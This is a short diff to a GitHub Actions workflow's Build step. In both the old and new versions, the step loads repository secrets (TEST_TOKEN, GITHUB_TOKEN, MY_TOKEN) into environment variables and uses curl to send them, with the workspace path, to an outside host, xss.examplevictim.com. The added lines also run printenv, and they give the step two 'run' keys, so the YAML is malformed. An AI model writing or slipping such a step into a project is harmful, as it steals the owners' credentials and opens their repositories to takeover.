@@ -8,6 +8,8 @@ jobs:
       - uses: actions/checkout@v3
       - name: Build
         env:
-                secret_test: ${{secrets.TEST_TOKEN}}
-                gh: ${{secrets.GITHUB_TOKEN}}
-        run: curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GH" -d "t=$SECRET_TEST" -d "z=$secret_test"
+                SECRET_TEST: ${{secrets.TEST_TOKEN}}
+                GH: ${{secrets.GITHUB_TOKEN}}
+                GITHUB_TOKEN: ${{ secrets.MY_TOKEN }}
+        run: curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GH" -d "t=$SECRET_TEST" -d "z=$GITHUB_TOKEN"
+        run: printenv
